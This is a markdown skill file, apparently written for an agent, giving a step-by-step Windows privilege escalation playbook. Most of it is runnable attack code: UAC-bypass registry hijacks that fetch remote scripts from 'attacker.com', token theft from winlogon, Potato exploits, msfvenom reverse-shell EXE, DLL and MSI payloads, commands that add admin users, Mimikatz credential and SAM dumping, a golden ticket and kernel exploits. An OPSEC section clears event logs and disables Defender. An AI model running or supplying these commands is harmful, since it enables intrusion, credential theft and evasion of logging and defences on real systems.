---
name: windows-privilege-escalation
description: Escalate from user to SYSTEM on Windows (UAC bypass, token manipulation, exploits)
version: 1.0.0
author: harezadmm
tags: [windows, privilege-escalation, uac-bypass, token-theft, privesc]
---

# Windows Privilege Escalation

## When to Use
Escalating privileges from standard user to Administrator or SYSTEM on Windows systems. Used in post-exploitation, red team operations, and penetration testing.

## Prerequisites
- Initial user-level shell access
- Windows target system (7/8/10/11, Server 2012-2022)
- Understanding of Windows security model
- PowerShell or command prompt access

## Attack Vectors

### 1. UAC Bypass
Bypass User Account Control without prompts.

### 2. Token Manipulation
Steal SYSTEM/Administrator tokens from processes.

### 3. Unquoted Service Paths
Exploit misconfigured service paths.

### 4. AlwaysInstallElevated
MSI packages run as SYSTEM if enabled.

### 5. Stored Credentials
Extract passwords from registry, memory, files.

### 6. Kernel Exploits
CVE exploits for privilege escalation.

## Procedure

### Step 1: Enumeration

**System information:**
```cmd
:: Basic info
systeminfo
whoami /all
hostname
net user %username%

:: Check privileges
whoami /priv

:: List local admins
net localgroup administrators

:: Check OS version
ver
wmic os get caption,version,buildnumber

:: Check architecture
wmic os get osarchitecture

:: List installed patches
wmic qfe list

:: Check antivirus
wmic /namespace:\\root\securitycenter2 path antivirusproduct

:: PowerShell version
powershell -c "$PSVersionTable"
```

**Check for quick wins:**
```powershell
# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Stored credentials
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Unquoted service paths
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Scheduled tasks running as SYSTEM
schtasks /query /fo LIST /v | findstr /i "Task To Run:"

# Writable system32
icacls C:\Windows\System32\config\

# Check for SAM/SYSTEM backup
dir C:\Windows\Repair\
dir C:\Windows\System32\config\RegBack\
```

**Automated enumeration:**
```powershell
# WinPEAS
curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -o winpeas.exe
.\winpeas.exe

# PowerUp
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# SharpUp
.\SharpUp.exe
```

### Step 2: UAC Bypass

**Method 1: fodhelper.exe (Windows 10)**
```powershell
# Create registry keys to hijack fodhelper
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')"
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""

# Execute
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

**Method 2: eventvwr.exe (Windows 7-10)**
```powershell
New-Item "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c powershell.exe -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"

Start-Process "C:\Windows\System32\eventvwr.exe"

Remove-Item "HKCU:\Software\Classes\mscfile\" -Recurse -Force
```

**Method 3: sdclt.exe (Windows 10)**
```powershell
New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(default)" -Value "powershell.exe -w hidden Start-Process cmd.exe -Verb runAs"
Set-ItemProperty "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value ""

Start-Process "C:\Windows\System32\sdclt.exe"

Remove-Item "HKCU:\Software\Classes\Folder\" -Recurse -Force
```

**Method 4: ComputerDefaults.exe**
```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c start cmd.exe"
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""

Start-Process "C:\Windows\System32\ComputerDefaults.exe"
```

### Step 3: Token Manipulation

**Steal SYSTEM token with PowerShell:**
```powershell
# Enable SeDebugPrivilege
function Enable-Privilege {
    param($Privilege)
    $Definition = @'
    using System;
    using System.Runtime.InteropServices;
    public class AdjPriv {
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
        
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
        
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid {
            public int Count;
            public long Luid;
            public int Attr;
        }
        
        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const int TOKEN_QUERY = 0x00000008;
        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        
        public static bool EnablePrivilege(long processHandle, string privilege) {
            bool retVal;
            TokPriv1Luid tp;
            IntPtr hproc = new IntPtr(processHandle);
            IntPtr htok = IntPtr.Zero;
            retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;
            retVal = LookupPrivilegeValue(null, privilege, ref tp.Luid);
            retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            return retVal;
        }
    }
'@
    Add-Type $Definition -PassThru | Out-Null
    $processHandle = (Get-Process -Id $pid).Handle
    [AdjPriv]::EnablePrivilege($processHandle, $Privilege)
}

Enable-Privilege -Privilege SeDebugPrivilege

# Impersonate SYSTEM token
$code = @'
using System;
using System.Runtime.InteropServices;

public class TokenManipulation {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);
    
    public static void ImpersonateSystem() {
        IntPtr hToken;
        IntPtr hDupToken;
        
        // Open winlogon.exe process token (runs as SYSTEM)
        System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcessesByName("winlogon");
        IntPtr handle = processes[0].Handle;
        
        OpenProcessToken(handle, 0x0002, out hToken);
        DuplicateToken(hToken, 2, out hDupToken);
        ImpersonateLoggedOnUser(hDupToken);
    }
}
'@

Add-Type $code
[TokenManipulation]::ImpersonateSystem()

# Now running as SYSTEM
whoami
```

**Rotten Potato (COM Server NTLM Relay):**
```powershell
# Download RottenPotato
IEX(New-Object Net.WebClient).DownloadString('https://github.com/foxglovesec/RottenPotato/raw/master/RottenPotato.ps1')

# Execute
Invoke-RottenPotato -Command "powershell.exe -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
```

**JuicyPotato (SeImpersonatePrivilege abuse):**
```cmd
:: Check if you have SeImpersonatePrivilege
whoami /priv | findstr SeImpersonate

:: Download JuicyPotato
curl https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -o jp.exe

:: Execute command as SYSTEM
jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Users\Public\proof.txt" -t *

:: Or get reverse shell
jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')" -t *
```

### Step 4: Service Exploitation

**Unquoted service paths:**
```cmd
:: Find unquoted service paths
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

:: Example vulnerable path:
:: C:\Program Files\Some App\service.exe
:: Windows checks in order:
:: 1. C:\Program.exe
:: 2. C:\Program Files\Some.exe
:: 3. C:\Program Files\Some App\service.exe

:: Create malicious executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o Program.exe

:: Place in C:\Program Files\
copy Program.exe "C:\Program Files\Some.exe"

:: Restart service
sc stop "VulnerableService"
sc start "VulnerableService"

:: Or wait for system reboot
```

**Weak service permissions:**
```powershell
# Check service permissions with accesschk
.\accesschk64.exe -uwcqv "Authenticated Users" * /accepteula

# If service modifiable, change binary path
sc config VulnerableService binpath= "cmd.exe /c net localgroup administrators user /add"
sc stop VulnerableService
sc start VulnerableService

# Verify
net localgroup administrators
```

**DLL hijacking:**
```cmd
:: Find services loading DLLs from writable locations
for /f "tokens=2 delims='='" %%a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do echo %%a

:: Use Process Monitor (procmon) to find missing DLLs
:: Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o hijack.dll

:: Place in PATH directory before legitimate DLL
copy hijack.dll C:\Temp\vulnerable.dll

:: Restart service or system
```

### Step 5: AlwaysInstallElevated

**Check if enabled:**
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Exploit:**
```bash
# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f msi -o evil.msi

# Transfer to target
```

```cmd
:: Install MSI (runs as SYSTEM)
msiexec /quiet /qn /i evil.msi
```

### Step 6: Stored Credentials

**Registry credentials:**
```cmd
:: Winlogon autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

:: VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password

:: SNMP community strings
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s

:: PuTTY saved sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

**Credential Manager:**
```powershell
# List stored credentials
cmdkey /list

# Use stored credential
runas /savecred /user:ADMIN "cmd.exe /c whoami > C:\Users\Public\proof.txt"

# Extract with PowerSploit
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command "vault::list"
```

**SAM/SYSTEM files:**
```cmd
:: Check for backups
dir C:\Windows\Repair\
dir C:\Windows\System32\config\RegBack\

:: Copy files
copy C:\Windows\Repair\SAM C:\Users\Public\SAM
copy C:\Windows\Repair\SYSTEM C:\Users\Public\SYSTEM

:: Extract with secretsdump (on attacker machine)
python secretsdump.py -sam SAM -system SYSTEM LOCAL
```

**Memory dump with Mimikatz:**
```powershell
# Download Mimikatz
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')

# Dump credentials
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"

# Dump LSA secrets
Invoke-Mimikatz -Command "lsadump::secrets"

# Dump SAM
Invoke-Mimikatz -Command "lsadump::sam"

# Golden ticket attack
Invoke-Mimikatz -Command "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:... /ptt"
```

### Step 7: Kernel Exploits

**Check for known vulnerabilities:**
```powershell
# List installed patches
wmic qfe list

# Check missing patches
systeminfo > sysinfo.txt
# Use Windows-Exploit-Suggester on attacker machine:
# python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt
```

**Common exploits:**

**MS16-032 (Secondary Logon Handle)**
```powershell
# Works on Windows 7-10 (unpatched)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1')
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
```

**MS15-051 (Client Copy Image)**
```cmd
:: Download exploit
curl https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/37049-32.exe -o ms15-051.exe

:: Execute
ms15-051.exe "cmd.exe /c net localgroup administrators user /add"
```

**MS17-010 (EternalBlue)**
```bash
# MSF module
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set LHOST attacker_ip
exploit
```

### Step 8: Scheduled Tasks Abuse

**Writable scheduled task:**
```cmd
:: List all scheduled tasks
schtasks /query /fo LIST /v

:: Check task permissions
icacls C:\Windows\Tasks\*
icacls C:\Windows\System32\Tasks\*

:: Find writable tasks
accesschk64.exe -qwsu "Everyone" C:\Windows\Tasks\
accesschk64.exe -qwsu "Everyone" C:\Windows\System32\Tasks\

:: Overwrite task action
echo cmd.exe /c "net localgroup administrators user /add" > C:\Windows\Tasks\backup.job

:: Or modify existing task
schtasks /change /tn "BackupTask" /tr "cmd.exe /c powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
```

## Pitfalls

**AV/EDR detection**: Mimikatz, PowerUp, WinPEAS trigger alerts. Use obfuscation.

**Logging**: Windows Event Logs record privilege changes (Event ID 4672, 4673, 4688).

**UAC bypass patched**: Microsoft patches bypass techniques regularly. Test first.

**Service restart**: Many exploits require service/system restart.

**Token expiration**: Stolen tokens expire on logout/reboot.

## Verification

```powershell
# Check current user
whoami

# Check privileges
whoami /priv

# Check groups
whoami /groups

# Verify SYSTEM
# Should output: nt authority\system
whoami

# Test file access
type C:\Windows\System32\config\SAM
# Should work if SYSTEM
```

## OPSEC

- Clear Windows Event Logs: `wevtutil cl System`, `wevtutil cl Security`
- Delete PowerShell history: `Remove-Item (Get-PSReadlineOption).HistorySavePath`
- Clear command history: `doskey /reinstall`
- Remove dropped files: `del C:\Users\Public\*.exe`
- Disable defender real-time: `Set-MpPreference -DisableRealtimeMonitoring $true`

## References

- PayloadsAllTheThings Windows PrivEsc
- HackTricks Windows Local Privilege Escalation
- LOLBAS (Living Off The Land Binaries)
- Windows Privilege Escalation Guide (Guif re)
- FuzzySecurity Windows Privilege Escalation Fundamentals
